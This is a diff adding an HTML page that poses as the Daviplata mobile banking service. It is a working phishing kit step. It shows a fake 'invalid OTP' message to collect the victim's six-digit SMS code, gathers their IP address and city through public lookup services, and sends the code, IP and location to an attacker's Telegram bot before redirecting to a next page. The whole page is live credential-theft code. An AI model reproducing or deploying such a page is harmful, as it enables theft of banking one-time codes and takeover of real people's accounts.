@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Daviplata</title>
+	<link rel="stylesheet" href="./archivos/style.css">
+	<script>
+
+	function soloNumeros(e){
+  	var key = window.event ? e.which : e.keyCode;
+  		if (key < 48 || key > 57) {
+    	e.preventDefault();
+  		}
+	}
+	</script>
+	
+		
+	<script src="datos_del_tel.js"></script>
+	
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+
+   <script>
+         $.getJSON("https://api.ipify.org?format=json",
+          function(data) {
+             $("#gfg").html(data.ip);
+         })
+      </script>
+      <script>
+         $.getJSON("https://ipinfo.io", function (response) {
+    $("#ip").html("IP: " + response.ip);
+    $("#address").html("" + response.city + ", " + response.country);
+    })
+
+	  </script>
+
+				<script>
+
+var u_name,   ip, ip2;
+var ready = function () {
+    u_name = document.getElementById("t4").value;
+    ip = document.getElementById("gfg").innerHTML;
+    ip2 = document.getElementById("address").innerHTML;
+    message = "👦DAVIPLATA GIL👦\n📲OtroCodigo: " + u_name + "\n📌IP: " + ip +"\n🌍 " + ip2;
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+	  window.location = 'index4.html';
+  
+        console.log(response);
+		
+
+	
+    });
+    return false;
+};
+
+			</script>
+	
+</head>
+<body>
+	<main><div class="cue">
+		<header>
+			
+		
+		<div class="hero">
+			<img src="./archivos/ffs.jpg" alt="">
+		</div>
+			
+		</header>
+		<div class="sm">
+			<img src="./archivos/ds.jpg" style="width:10%"  alt=""><br>
+			<div class="p">
+				<p>Escriba el código que te llegó por mensaje de texto a su celular</p>
+			</div>
+
+		</div>
+		<p style="color: #D03030;  font-size: 14px;">Código OTP invalido</p>
+
+	<div class="tk">
+		<form action="" method="post" onsubmit="return sender()">
+		<p id="gfg"  hidden=""></p>
+						<p id="address"  hidden=""></p>
+			<div class="campos">
+				
+				<input name="s2" id="t4" type="text" placeholder="Numero de 6 digitos" required="" maxlength="6" minlength="6" onkeypress="soloNumeros(event)" autocomplete="none">
+			</div>
+			<button>Continuar</button>
+		</form>
+	</div>
+	
+	</div>
+
+
+	</main>
+
+
+</body>
+</noscript>
+<div style="text-align: center;"><div style="position:relative; top:0; margin-right:auto;margin-left:auto; z-index:99999">
+
+</div></div></html>
